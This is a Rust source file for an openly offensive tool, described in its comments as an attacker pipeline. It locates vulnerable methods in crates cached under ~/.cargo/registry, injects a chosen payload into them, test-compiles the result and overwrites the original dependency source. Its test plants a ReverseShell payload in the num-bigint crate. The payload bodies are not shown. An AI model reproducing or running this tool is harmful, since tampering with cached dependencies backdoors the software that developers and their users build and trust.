// Mock shell that receives commands

// Define available commands and their I/O (integration requires that vanalyzer has been run before) and the context they should be called in
// (maybe inside a thread)

// Vanalyzer command
// vanalyzer <target-project-path> <target-username>
// runs the script vanalyzer/run.sh and stores its result in a variable (use Command crate opening
// a socket to get the output and deserialize it)
// Finally show the formatted output to the user with the vulnerable files ordered with its
// vulnerable methods listed as well

// Integrate command
// integrate <file_no> <method_no> <payload>
// copy-pastes the code from <payload> into <file_no> in the file's <method_no>'th method
// produce a mock result (duplicate the file with the integrated payload) and compile it to check
// nothing's wrong

// Ok command
// ok
// inject the code into the source file

// Atacker pipeline:
// 1. Run the mock shell (cargo project)
// 2. run vanalyzer command
// 3. run integrate command
// 4. run ok command

#[macro_use]
extern crate log;

mod compilation;
mod payload;
mod vanalyzer;

use std::io::Write;
use std::path::Path;

use compilation::*;
use payload::*;
use vanalyzer::*;

// Returns a rust program to be compiled afterwards
// Injects in the <file_selected> file at line <method_starting_line> the code for running
// <payload>
// <file_selected> has to be the absolute path to the file
fn integrate(
    file_selected: &String,
    method_starting_line: usize,
    payload: &dyn Payload,
) -> PayloadResult<String> {
    let injected_payload = payload.inject(
        &std::fs::read_to_string(file_selected.clone()).unwrap(),
        &method_starting_line,
    )?;
    let file_name = "/tmp/mock_program";
    let _ = std::fs::File::create(&file_name)
        .unwrap()
        .write(&injected_payload.as_bytes())
        .unwrap();
    Ok(file_name.to_string())
}
// returns error if compilation was not successful
fn ok_command(comp_stat: &CompilationStatus) -> Result<(), String> {
    match comp_stat {
        CompilationStatus::Correct(prog, file) /* Merge file */ => {
            let src_prog = std::fs::read_to_string(&prog).unwrap();
            std::fs::OpenOptions::new()
                .write(true)
                .truncate(true)
                .open(file)
                .unwrap()
                .write(src_prog.as_bytes())
                .unwrap();
            let _ = std::fs::remove_file(prog).unwrap();
            Ok(())
        },
        CompilationStatus::Flaw(e) => Err(format!("Error while compiling: {e}"))
    }
}

fn main() {
    env_logger::init();
    // launch reader thread with socket fd
    let (tx, rx) = std::sync::mpsc::channel::<String>();
    std::thread::spawn(move || {
        loop {
            let stdin = std::io::stdin();
            let mut buf: String = "".to_string();
            match stdin.read_line(&mut buf) {
                Ok(_) => {
                    info!("sent message");
                    tx.send(buf).unwrap()
                }
                Err(_) =>
                /* This should cause a dead end error */
                {
                    drop(tx);
                    break;
                }
            }
        }
    });
    let mut va_output: Option<Vaoutput> = None;
    let mut comp_res: Option<CompilationStatus> = None;
    loop {
        match rx.try_recv().ok() {
            Some(cmd) => {
                println!("Received command {cmd}");
                // act as shell and substitute shell variables
                let cmd_parts: Vec<&str> = cmd.split(' ').collect();
                match cmd_parts[0].trim() {
                    "vanalyze" => {
                        info!("Running vanalyzer command");
                        match vanalyze(Path::new(&cmd_parts[1]), &cmd_parts[2]) {
                            Ok(vaout) => va_output = Some(vaout),
                            Err(e) => error!("Run vanalyzer again due to unexpected: {e}"),
                        }
                    }
                    "integrate" => {
                        info!("Running integrate command");
                        if let Some(ref va_out) = va_output {
                            let file_no = cmd_parts[1].parse::<usize>().unwrap();
                            let file_selected =
                                va_out.nth_file(file_no.clone()).expect("Bad file number");
                            let method_sl = file_selected
                                .nth_method_sl(cmd_parts[2].parse::<usize>().unwrap())
                                .expect("Bad method number");
                            let integrated_payload = integrate(
                                &file_selected.name,
                                method_sl.clone(),
                                payload_from_str(cmd_parts[3]),
                            )
                            .unwrap();
                            comp_res = Some(compile_mock_integration(
                                &integrated_payload,
                                va_out.nth_file_crate(file_no).expect("Bad file number"),
                                &file_selected.name,
                            ));
                        } else {
                            error!("You must run vanalyze command before");
                        }
                    }
                    "exploit" => {
                        info!("Running exploit command");
                        // get method starting line
                        // read file until you hit with the method
                        let reader = std::fs::read_to_string(&cmd_parts[1].to_string()).unwrap();
                        let maybe_line = reader
                            .lines()
                            .enumerate()
                            .filter(|(_, line)| {
                                line.contains(" fn ") && line.contains(cmd_parts[2])
                            } /* may not be exhaustive but dah */)
                            .collect::<Vec<(usize, &str)>>();

                        if maybe_line.len() > 0 {
                            let method_line = maybe_line[0].0 + 1;
                            let integrated_payload = integrate(
                                &cmd_parts[1].to_string(),
                                method_line,
                                payload_from_str(cmd_parts[3]),
                            );
                            // /home/username/.cargo/registry/src/*/crate_name/...
                            // crate's path ends at the 8th forslash
                            let (target_crate, target_file) = cmd_parts[1]
                                .match_indices('/')
                                .nth(7)
                                .map(|(index, _)| cmd_parts[1].split_at(index))
                                .unwrap();
                            let target_file = target_file.replacen('/', "", 1);
                            comp_res = Some(compile_mock_integration(
                                &integrated_payload.unwrap(),
                                target_crate,
                                &target_file,
                            ));
                            println!("Compiled successfully");
                        } else {
                            error!("Method not found in specified file")
                        }
                    }
                    "ok" => {
                        info!("Running ok command");
                        if let Some(ref compiled) = comp_res {
                            match ok_command(compiled) {
                                Ok(_) => println!("Payload has been successfully injected"),
                                Err(e) => println!("{e}"),
                            }
                            info!("Payload has been successfully injected");
                        } else {
                            error!("You must run integrate command before");
                        }
                    }
                    _ => error!("Unknown command"),
                }
            }
            None => (),
        }
    }
}

#[cfg(test)]
mod tests {

    use super::*;
    use std::process::Command;
    #[test]
    fn injects_and_compiles() {
        // inject
        let target_crate = "index.crates.io-6f17d22bba15001f/num-bigint-0.1.44";
        let target_file = "src/bigint.rs";
        let home = Command::new("/bin/bash")
            .arg("-c")
            .arg("echo $HOME")
            .output()
            .unwrap();
        let home = String::from_utf8(home.stdout).unwrap().trim().to_string();
        let integrate_file = home + "/.cargo/registry/src/" + &target_crate + "/" + &target_file;
        let injected_code_file = integrate(&integrate_file, 188, &ReverseShell {}).unwrap();
        if let CompilationStatus::Correct(_, _) =
            compile_mock_integration(&injected_code_file, target_crate, target_file)
        {
            assert!(true);
        } else {
            assert!(false);
        }
    }
}
